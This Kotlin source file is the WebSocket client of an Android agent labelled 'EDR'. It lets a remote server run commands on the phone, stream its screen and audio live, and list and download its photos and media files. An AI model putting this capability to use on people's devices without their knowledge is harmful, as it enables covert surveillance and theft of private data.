package com.edr.agent.network

import android.content.Context
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.BatteryManager
import android.os.Build
import android.os.PowerManager
import android.util.Log
import com.edr.agent.media.DeviceMediaManager
import com.edr.agent.permission.EdrPermissionManager
import com.edr.agent.policy.EdrPolicyManager
import com.edr.agent.responder.ActiveResponder
import com.edr.agent.screen.AudioStreamManager
import com.edr.agent.screen.ScreenStreamManager
import com.edr.agent.service.EdrForegroundService
import com.edr.agent.storage.SyncPreferences
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import java.util.concurrent.Executors
import java.util.concurrent.ScheduledFuture
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

/**
 * EDR WebSocket Client.
 *
 * Maintains a persistent connection to the EDR management server.
 *
 * Battery-saving design:
 *  - Shared OkHttpClient connection & thread pool via EdrHttpClient
 *  - Heartbeat every 75 seconds (server timeout is 180s) without acquiring WakeLocks
 *  - Cached permission map refreshed at most every 5 minutes (or on open/ping)
 *  - True exponential backoff reconnect: 5s, 10s, 20s, 40s, 60s, 120s max
 *  - Skips tight retries when offline until ConnectivityManager signals network return
 */
class EdrWebSocketClient(private val context: Context) : WebSocketListener() {

    private val httpClient = EdrHttpClient.wsClient

    private val gson = Gson()
    private var webSocket: WebSocket? = null
    private val scheduler = Executors.newSingleThreadScheduledExecutor()
    // Bounded thread pool for media operations — avoids creating unlimited threads under load
    private val mediaExecutor = Executors.newFixedThreadPool(2)
    // Bounded executor for EXECUTE_COMMAND so OkHttp's reader thread never blocks
    private val commandExecutor = Executors.newFixedThreadPool(3)
    private var heartbeatTask: ScheduledFuture<*>? = null
    private var reconnectTask: ScheduledFuture<*>? = null
    private var reconnectAttempt = 0
    private var currentHostInUse = SyncPreferences.serverHost
    private val isDisconnecting = AtomicBoolean(false)
    private val isSocketOpen = AtomicBoolean(false)
    private val isConnecting = AtomicBoolean(false)
    @Volatile
    private var connectStartedAt = 0L
    @Volatile
    private var cachedPermissionsMap: Map<String, Boolean> = emptyMap()
    @Volatile
    private var lastPermissionsCheckTime = 0L

    val isConnected: Boolean
        get() = webSocket != null && !isDisconnecting.get() && isSocketOpen.get()

    /** True when disconnect() was called deliberately (e.g. dashboard command). */
    val isIntentionallyDisconnected: Boolean
        get() = isDisconnecting.get()

    fun getCandidateHosts(): List<String> {
        // Only use the cloud/configured host automatically.
        // 127.0.0.1 and 10.0.2.2 were causing unnecessary 5s timeout delays on real devices.
        return listOf(SyncPreferences.serverHost).distinct()
    }

    fun resetDisconnectAndConnect(targetHost: String? = null) {
        isDisconnecting.set(false)
        if (isConnected) return
        reconnectAttempt = 0
        reconnectTask?.cancel(false)
        val hostToTry = targetHost ?: getCandidateHosts().first()
        connect(hostToTry)
    }

    @Synchronized
    fun connect(targetHost: String = getCandidateHosts().first()) {
        if (isDisconnecting.get() || isSocketOpen.get()) return
        val now = System.currentTimeMillis()
        if (isConnecting.get() && now - connectStartedAt < 12_000L) {
            return
        }
        isConnecting.set(true)
        connectStartedAt = now
        try {
            try { webSocket?.cancel() } catch (ignored: Exception) {}
            currentHostInUse = targetHost
            val port = SyncPreferences.serverPort
            val deviceId = SyncPreferences.deviceId
            val cleanHost = targetHost.trim()
                .removePrefix("https://")
                .removePrefix("http://")
                .removePrefix("wss://")
                .removePrefix("ws://")
                .trimEnd('/')

            val url = if (targetHost.startsWith("wss://")) {
                "wss://$cleanHost/ws?deviceId=$deviceId"
            } else if (targetHost.startsWith("ws://")) {
                "ws://$cleanHost:$port/ws?deviceId=$deviceId"
            } else if (cleanHost.contains(".onrender.com") || cleanHost.contains(".trycloudflare.com") || cleanHost.contains(".railway.app")) {
                "wss://$cleanHost/ws?deviceId=$deviceId"
            } else {
                "ws://$cleanHost:$port/ws?deviceId=$deviceId"
            }
            Log.i(TAG, "Connecting to EDR Server: $url")
            val request = Request.Builder().url(url).build()
            webSocket = httpClient.newWebSocket(request, this)
        } catch (e: Exception) {
            isConnecting.set(false)
            Log.w(TAG, "Failed initiating WebSocket: ${e.message}")
            scheduleReconnect()
        }
    }

    override fun onOpen(webSocket: WebSocket, response: Response) {
        if (this.webSocket != null && this.webSocket !== webSocket) {
            Log.w(TAG, "Ignoring onOpen from superseded WebSocket")
            try { webSocket.close(1000, "Superseded") } catch (ignored: Exception) {}
            return
        }
        isConnecting.set(false)
        Log.i(TAG, "Connected to EDR Server at $currentHostInUse")
        isSocketOpen.set(true)
        reconnectAttempt = 0
        // Save successful host for next startup if it's a real LAN IP
        if (currentHostInUse != "127.0.0.1" && currentHostInUse != "10.0.2.2" && SyncPreferences.serverHost != currentHostInUse) {
            SyncPreferences.serverHost = currentHostInUse
        }
        this.webSocket = webSocket

        // Register the WebSocket sender for live screen and live audio streaming modules
        ScreenStreamManager.wsSender = { msg -> this.webSocket?.send(msg) ?: false }
        AudioStreamManager.wsSender = { msg -> this.webSocket?.send(msg) ?: false }

        // Send device registration
        val bm = context.getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
        val battery = bm?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: 100
        val netInfo = getNetworkQualityInfo()
        val perms = EdrPermissionManager.getAllPermissionsMap(context)
        cachedPermissionsMap = perms
        lastPermissionsCheckTime = System.currentTimeMillis()

        val registerMsg = mapOf(
            "type" to "AGENT_REGISTER",
            "deviceId" to SyncPreferences.deviceId,
            "payload" to mapOf(
                "deviceId" to SyncPreferences.deviceId,
                "deviceName" to "${Build.MANUFACTURER} ${Build.MODEL}",
                "osVersion" to "Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})",
                "batteryLevel" to battery,
                "isDeviceOwner" to EdrPolicyManager.isDeviceOwner(context),
                "trapAppPackages" to SyncPreferences.getTrapAppPackages().toList(),
                "networkQuality" to (netInfo["networkQuality"] ?: "FAST"),
                "downstreamKbps" to (netInfo["downstreamKbps"] ?: 10000),
                "permissions" to perms,
                "appVersionCode" to com.edr.agent.update.AppUpdateManager.getCurrentVersionCode(context),
                "appVersionName" to com.edr.agent.update.AppUpdateManager.getCurrentVersionName(context)
            ),
            "timestamp" to SyncPreferences.getCurrentIsoTimestamp()
        )
        webSocket.send(gson.toJson(registerMsg))

        // Sync installed packages only if changed since last sync (saves CPU/APK hashing on reconnects)
        com.edr.agent.telemetry.AppInventoryManager.syncNow(context, { msg -> this.send(msg) }, force = false)

        EdrForegroundService.instance?.onWebSocketStateChanged(true)

        // Heartbeat every 75 seconds (server allows 180s before offline)
        startHeartbeat()
    }

    override fun onMessage(webSocket: WebSocket, text: String) {
        try {
            val type = object : TypeToken<Map<String, Any>>() {}.type
            val data: Map<String, Any> = gson.fromJson(text, type)
            val msgType = data["type"] as? String ?: return
            val payload = data["payload"] as? Map<String, Any> ?: emptyMap()

            Log.d(TAG, "Received: $msgType")

            when (msgType) {
                "REGISTRATION_ACK" -> {
                    // Apply the server policy immediately on first connect
                    val policyMap = payload["policy"] as? Map<String, Any>
                    if (policyMap != null) {
                        Log.i(TAG, "Applying initial policy from server registration ACK")
                        EdrPolicyManager.applyPolicy(context, policyMap, isInitialRegistration = true)
                    }
                }

                "EXECUTE_COMMAND" -> {
                    val cmdId = payload["id"] as? String ?: ""
                    val cmdType = payload["commandType"] as? String ?: ""
                    val parameters = payload["parameters"] as? Map<String, Any>
                    commandExecutor.execute {
                        val (status, resultMessage) = ActiveResponder.execute(context, cmdId, cmdType, parameters)
                        sendAck(cmdId, status, resultMessage)
                    }
                }

                "APPLY_POLICY" -> {
                    EdrPolicyManager.applyPolicy(context, payload)
                    val ack = mapOf(
                        "type" to "POLICY_ACK",
                        "deviceId" to SyncPreferences.deviceId,
                        "payload" to mapOf("status" to "SUCCESS"),
                        "timestamp" to SyncPreferences.getCurrentIsoTimestamp()
                    )
                    webSocket.send(gson.toJson(ack))
                }

                "PING_AGENT" -> {
                    val reqId = payload["requestId"] as? String ?: ""
                    val pm = context.getSystemService(Context.POWER_SERVICE) as? android.os.PowerManager
                    val screenOn = pm?.isInteractive ?: true
                    val pong = mapOf(
                        "type" to "PONG_AGENT",
                        "deviceId" to SyncPreferences.deviceId,
                        "payload" to mapOf(
                            "requestId" to reqId,
                            "screenOn" to screenOn,
                            "clientTimestamp" to System.currentTimeMillis()
                        ),
                        "timestamp" to SyncPreferences.getCurrentIsoTimestamp()
                    )
                    webSocket.send(gson.toJson(pong))
                }

                "FETCH_DEVICE_MEDIA_LIST" -> {
                    val reqId = payload["requestId"] as? String ?: ""
                    val typeFilter = payload["typeFilter"] as? String ?: "ALL"
                    val bucketFilter = payload["bucketFilter"] as? String
                    val searchQuery = payload["searchQuery"] as? String
                    val offset = (payload["offset"] as? Number)?.toInt() ?: 0
                    val limit = (payload["limit"] as? Number)?.toInt() ?: 60
                    val includeThumbnails = payload["includeThumbnails"] as? Boolean ?: true

                    mediaExecutor.execute {
                        try {
                            val result = DeviceMediaManager.fetchMediaList(
                                context = context,
                                typeFilter = typeFilter,
                                bucketFilter = bucketFilter,
                                searchQuery = searchQuery,
                                offset = offset,
                                limit = limit,
                                includeThumbnails = includeThumbnails
                            )
                            val resMsg = mapOf(
                                "type" to "DEVICE_MEDIA_LIST_RESULT",
                                "deviceId" to SyncPreferences.deviceId,
                                "payload" to mapOf(
                                    "requestId" to reqId,
                                    "result" to result
                                ),
                                "timestamp" to SyncPreferences.getCurrentIsoTimestamp()
                            )
                            webSocket.send(gson.toJson(resMsg))
                        } catch (e: Exception) {
                            Log.e(TAG, "Error fetching media list: ${e.message}")
                            val err = mapOf(
                                "type" to "DEVICE_MEDIA_LIST_RESULT",
                                "deviceId" to SyncPreferences.deviceId,
                                "payload" to mapOf(
                                    "requestId" to reqId,
                                    "error" to (e.message ?: "Failed querying device media")
                                ),
                                "timestamp" to SyncPreferences.getCurrentIsoTimestamp()
                            )
                            webSocket.send(gson.toJson(err))
                        }
                    }
                }

                "FETCH_DEVICE_MEDIA_FILE" -> {
                    val reqId = payload["requestId"] as? String ?: ""
                    val mediaIdStr = payload["mediaId"]?.toString() ?: "0"
                    val mediaId = mediaIdStr.toLongOrNull() ?: 0L
                    val mediaType = payload["mediaType"] as? String ?: "IMAGE"

                    mediaExecutor.execute {
                        try {
                            DeviceMediaManager.streamMediaFile(
                                context = context,
                                mediaId = mediaId,
                                mediaType = mediaType,
                                requestId = reqId
                            ) { chunkMap ->
                                val chunkMsg = mapOf(
                                    "type" to "DEVICE_MEDIA_CHUNK",
                                    "deviceId" to SyncPreferences.deviceId,
                                    "payload" to chunkMap,
                                    "timestamp" to SyncPreferences.getCurrentIsoTimestamp()
                                )
                                webSocket.send(gson.toJson(chunkMsg))
                            }
                        } catch (e: Exception) {
                            Log.e(TAG, "Error in streamMediaFile: ${e.message}")
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error processing server message: ${e.message}")
        }
    }

    fun send(text: String): Boolean {
        return webSocket?.send(text) ?: false
    }

    private fun sendAck(commandId: String, status: String, resultMessage: String) {
        val ack = mapOf(
            "type" to "COMMAND_ACK",
            "deviceId" to SyncPreferences.deviceId,
            "payload" to mapOf(
                "commandId" to commandId,
                "status" to status,
                "resultMessage" to resultMessage
            ),
            "timestamp" to SyncPreferences.getCurrentIsoTimestamp()
        )
        webSocket?.send(gson.toJson(ack))
    }

    private fun getNetworkQualityInfo(): Map<String, Any> {
        return try {
            val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? android.net.ConnectivityManager
            val net = cm?.activeNetwork
            val caps = cm?.getNetworkCapabilities(net)
            if (caps != null) {
                val downKbps = caps.linkDownstreamBandwidthKbps
                val isSlow = downKbps in 1..1500 // less than 1.5 Mbps
                mapOf(
                    "networkQuality" to if (isSlow) "SLOW" else "FAST",
                    "downstreamKbps" to downKbps
                )
            } else {
                mapOf(
                    "networkQuality" to "SLOW",
                    "downstreamKbps" to 0
                )
            }
        } catch (e: Exception) {
            emptyMap()
        }
    }

    private fun hasActiveInternet(): Boolean {
        return try {
            val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager ?: return true
            val net = cm.activeNetwork ?: return false
            val caps = cm.getNetworkCapabilities(net) ?: return false
            caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
                caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
        } catch (_: Exception) {
            true
        }
    }

    private fun startHeartbeat() {
        heartbeatTask?.cancel(false)
        var lastBatteryReadTime = 0L
        var cachedBattery = 100

        // 75 seconds — saves CPU/radio wakeups while staying well inside the server 180s timeout window.
        // Avoids acquiring PARTIAL_WAKE_LOCK on every routine heartbeat (OkHttp WS pingInterval handles keepalive).
        heartbeatTask = scheduler.scheduleAtFixedRate({
            try {
                if (!isConnected) return@scheduleAtFixedRate

                val now = System.currentTimeMillis()
                // Re-read battery at most every 5 minutes (it doesn't change that fast)
                if (now - lastBatteryReadTime >= 300_000L) {
                    val bm = context.getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
                    cachedBattery = bm?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: cachedBattery
                    lastBatteryReadTime = now
                }
                // Re-query 9 permission binder IPCs at most every 5 minutes (or on PING/open)
                if (now - lastPermissionsCheckTime >= 300_000L || cachedPermissionsMap.isEmpty()) {
                    cachedPermissionsMap = EdrPermissionManager.getAllPermissionsMap(context)
                    lastPermissionsCheckTime = now
                }

                val netInfo = getNetworkQualityInfo()
                val beat = mapOf(
                    "type" to "HEARTBEAT",
                    "deviceId" to SyncPreferences.deviceId,
                    "payload" to mapOf(
                        "batteryLevel" to cachedBattery,
                        "networkQuality" to (netInfo["networkQuality"] ?: "FAST"),
                        "downstreamKbps" to (netInfo["downstreamKbps"] ?: 10000),
                        "permissions" to cachedPermissionsMap
                    ),
                    "timestamp" to SyncPreferences.getCurrentIsoTimestamp()
                )
                webSocket?.send(gson.toJson(beat))
            } catch (e: Exception) {
                Log.w(TAG, "Heartbeat failed: ${e.message}")
            }
        }, 75L, 75L, TimeUnit.SECONDS)
    }

    override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
        if (this.webSocket != null && this.webSocket !== webSocket) {
            Log.d(TAG, "Ignoring onClosed from superseded WebSocket: $reason ($code)")
            return
        }
        isConnecting.set(false)
        Log.w(TAG, "WebSocket closed: $reason ($code)")
        isSocketOpen.set(false)
        ScreenStreamManager.stopStreaming()
        ScreenStreamManager.wsSender = null
        AudioStreamManager.stopStreaming()
        AudioStreamManager.wsSender = null
        if (code == 1000 && reason.contains("Dashboard Admin")) {
            isDisconnecting.set(true)
        }
        EdrForegroundService.instance?.onWebSocketStateChanged(false)
        if (!isDisconnecting.get()) {
            scheduleReconnect()
        }
    }

    override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
        if (this.webSocket != null && this.webSocket !== webSocket) {
            Log.d(TAG, "Ignoring onFailure from stale WebSocket: ${t.message}")
            return
        }
        isConnecting.set(false)
        Log.w(TAG, "WebSocket failure: ${t.message}")
        isSocketOpen.set(false)
        ScreenStreamManager.stopStreaming()
        ScreenStreamManager.wsSender = null
        AudioStreamManager.stopStreaming()
        AudioStreamManager.wsSender = null
        EdrForegroundService.instance?.onWebSocketStateChanged(false)
        if (!isDisconnecting.get()) {
            scheduleReconnect()
        }
    }

    /**
     * Reconnect with true exponential backoff to save battery when server or network is unavailable.
     * Delays: 5s, 10s, 20s, 40s, 60s, 120s max (or 120s immediately when offline/screen off).
     */
    private fun scheduleReconnect() {
        heartbeatTask?.cancel(false)
        reconnectTask?.cancel(false)

        val pm = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
        val screenInteractive = pm?.isInteractive ?: true
        val backoffSteps = longArrayOf(5L, 10L, 20L, 40L, 60L, 120L)
        val delaySeconds = if (!hasActiveInternet()) {
            // Avoid spinning TLS handshakes with no network; NetworkCallback wakes us immediately on return
            120L
        } else if (!screenInteractive && reconnectAttempt >= 2) {
            maxOf(backoffSteps[minOf(reconnectAttempt, backoffSteps.lastIndex)], 60L)
        } else {
            backoffSteps[minOf(reconnectAttempt, backoffSteps.lastIndex)]
        }
        Log.d(TAG, "Reconnecting in ${delaySeconds}s (attempt #${reconnectAttempt + 1})")

        reconnectTask = scheduler.schedule({
            reconnectAttempt++
            if (hasActiveInternet()) {
                connect(SyncPreferences.serverHost)
            } else {
                scheduleReconnect()
            }
        }, delaySeconds, TimeUnit.SECONDS)
    }

    fun disconnect() {
        isDisconnecting.set(true)
        isConnecting.set(false)
        isSocketOpen.set(false)
        ScreenStreamManager.stopStreaming()
        ScreenStreamManager.wsSender = null
        AudioStreamManager.stopStreaming()
        AudioStreamManager.wsSender = null
        heartbeatTask?.cancel(false)
        reconnectTask?.cancel(false)
        try {
            webSocket?.close(1000, "Disconnected by Dashboard Admin")
        } catch (e: Exception) {
            Log.w(TAG, "Error closing WebSocket: ${e.message}")
        }
        webSocket = null
        EdrForegroundService.instance?.onWebSocketStateChanged(false)
    }

    fun shutdown() {
        disconnect()
        scheduler.shutdownNow()
        mediaExecutor.shutdownNow()
        commandExecutor.shutdownNow()
    }

    companion object {
        private const val TAG = "EdrWebSocketClient"
    }
}
